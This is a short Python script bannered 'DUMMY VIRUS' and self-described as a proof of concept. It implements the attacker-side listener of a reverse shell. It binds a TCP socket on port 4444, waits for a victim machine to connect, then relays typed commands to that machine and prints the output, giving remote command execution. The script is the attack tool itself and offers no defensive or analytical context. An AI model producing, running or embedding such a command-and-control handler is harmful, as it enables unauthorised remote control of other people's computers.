

#!/usr/bin/python



import socket
import time
print("""
██████╗░██╗░░░██╗███╗░░░███╗███╗░░░███╗██╗░░░██╗  ██╗░░░██╗██╗██████╗░██╗░░░██╗░██████╗
██╔══██╗██║░░░██║████╗░████║████╗░████║╚██╗░██╔╝  ██║░░

░██║██║██╔══██╗██║░░░██║██╔════╝
██║░░██║██║░░░██║██╔████╔██║██╔████╔██║░╚████╔╝░  ╚██╗░██╔╝██║██████╔╝██║░░░██║╚█████╗░
██║░░██║██║░░░██║██║╚██╔╝██║██║╚██╔╝██║░░╚██╔╝░░  ░╚████╔╝░██║██╔══██╗██║░░░██║░╚═══██╗
██████╔╝╚██████╔╝██║░╚═╝░██║██║░╚═╝░██║░░░██║░░░  ░░╚██╔╝░░██║██║░░██║╚██████╔╝██████╔╝
╚═════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝░░░╚═╝░░░  ░░░╚═╝░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
                                                                                --v0.1
""")
input("THIS IS JUST A PoC(Proof Of Concept)DON'T GET YOUR HOPES UP,[ENTER] TO CONTINUE")
a = input ("enter ip address:")
listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

listener.bind((a,4444))
listener.listen(0)
print ("[+] Looking For Connection ⌐■_■ \n")
connection,address = listener.accept()
print ("heheheee \n")
time.sleep(1)
print (" （￣︶￣）*smirk　\n ")
time.sleep(2)
print ("[+] Got a Connection from " + str(address))

while True:
    command = input(">> ")
    if command.strip() == "":
        continue  
    connection.send(command.encode())
    result = connection.recv(20480)
    print(result.decode())



